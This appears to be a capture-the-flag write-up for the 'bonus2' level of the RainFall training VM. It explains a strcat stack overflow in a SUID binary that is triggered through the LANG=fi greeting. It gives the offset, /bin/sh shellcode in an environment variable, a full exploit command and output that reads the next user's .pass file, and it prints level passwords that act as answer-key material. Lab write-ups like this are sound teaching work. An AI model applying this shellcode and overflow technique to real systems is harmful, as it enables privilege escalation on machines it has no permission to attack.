# bonus2

## 1. Connect to the VM

The password for `bonus2`, obtained by solving `bonus1`, is:

```text
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

Connect with:

```bash
ssh bonus2@localhost -p 4242
```

## 2. Read the source

The equivalent C code is in `source.c`. The program copies `argv[1]` (40 bytes)
then `argv[2]` (32 bytes) into a buffer passed to `greetuser`, which prepends a
greeting and calls `puts`.

## 3. Disassemble / Analyse the binary

SUID `bonus3`. `greetuser` has a 72-byte stack buffer. It `strcpy`s a greeting
then `strcat`s the user input with no bounds check:

| `LANG` | greeting            | length |
|--------|---------------------|--------|
| *(none)* | `"Hello "`        | 6      |
| `nl`   | `"Goedemiddag! "`  | 13     |
| `fi`   | `"Hyvää päivää "` | 18     |

With `LANG=fi`: 18 + 40 + 32 = 90 bytes into a 72-byte buffer -> 18-byte overflow.

## 4. Find the offset

```
+------------------+--------------------+--------+----------+----------+
|  greeting (18)   |    argv[1] (40)    | argv[2]| saved    | return   |
|                  |                    | [0..13]| EBP (4)  | addr (4) |
+------------------+--------------------+--------+----------+----------+
<--------------------- 72 bytes -------------------><--- overflow --->
```

`argv[2]` = 18 bytes padding + 4-byte return address (little-endian).
`argv[1]` must be exactly 40 bytes to avoid a premature null byte.

## 5. Exploit the binary

```bash
export EGG=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

Find `EGG`'s address in GDB (`x/500s *environ`), pick an address in the NOP sled,
then:

```bash
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x5f\xfd\xff\xbf"')
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) ...
$ cat /home/user/bonus3/.pass
```

The output contains:

```text
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

This is the password stored in `flag` and can be used to connect as `bonus3`.

